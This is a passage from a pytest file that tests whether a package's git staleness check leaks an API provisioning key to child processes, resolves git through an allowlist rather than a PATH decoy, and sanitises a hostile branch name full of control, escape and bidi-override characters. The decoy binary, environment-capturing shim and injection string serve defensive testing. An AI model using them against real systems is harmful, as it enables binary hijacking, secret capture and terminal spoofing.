    output = tmp_path / "git-environment.json"
    shim = tmp_path / "allowlisted-git"
    shim.write_text(
        f"#!{sys.executable}\n"
        "import json, os, pathlib, sys\n"
        f"pathlib.Path({str(output)!r}).write_text(json.dumps(\n"
        "    {'env': dict(os.environ), 'argv': sys.argv}))\n"
        f"print({branch!r})\n"
    )
    shim.chmod(0o700)
    monkeypatch.setitem(TOOL_PATHS, "git", str(shim))
    monkeypatch.setitem(TOOL_PATHS, "python", sys.executable)
    # Set management authority inside the real driver, after its own launch.
    # A PATH decoy runs the same probe so the baseline exposes both failures.
    decoy = tmp_path / "git"
    decoy.write_text(shim.read_text())
    decoy.chmod(0o700)
    code = (
        "import os; from kew import staleness; "
        "from kew.subprocess_utils import TOOL_PATHS; "
        "os.environ['OPENROUTER_PROVISIONING_KEY'] = 'management-round8'; "
        f"os.environ['PATH'] = {str(tmp_path)!r}; "
        f"TOOL_PATHS['git'] = {TOOL_PATHS['git']!r}; "
        "staleness._get_direct_url = lambda: "
        f"{{'url': 'file://{tmp_path}', 'dir_info': {{'editable': True}}}}; "
        "staleness._git_commits_behind = lambda path: 1; "
        "print(staleness.check_editable_staleness(), end='')"
    )
    warning = run(["python", "-c", code], timeout=10).stdout
    return warning, json.loads(output.read_text()), shim


def test_round8_staleness_git_filters_real_child(tmp_path, monkeypatch):
    warning, observed, shim = _round8_branch_warning(
        tmp_path, monkeypatch, "round8-fixed-branch"
    )
    assert "OPENROUTER_PROVISIONING_KEY" not in observed["env"]
    assert observed["argv"][0] == str(shim)
    assert "round8-fixed-branch" in warning


def test_round8_staleness_branch_warning_bounds_controls(tmp_path, monkeypatch):
    warning, _, _ = _round8_branch_warning(
        tmp_path, monkeypatch, "b\x00\x01\x1b\t\n\x7f\x85\u202e\u2028" * 400
    )
    expected_branch = "b" * 120
    assert f"branch '{expected_branch}'" in warning
    assert all(char.isprintable() for char in warning)
    assert len(warning) <= 300 + len(str(tmp_path))
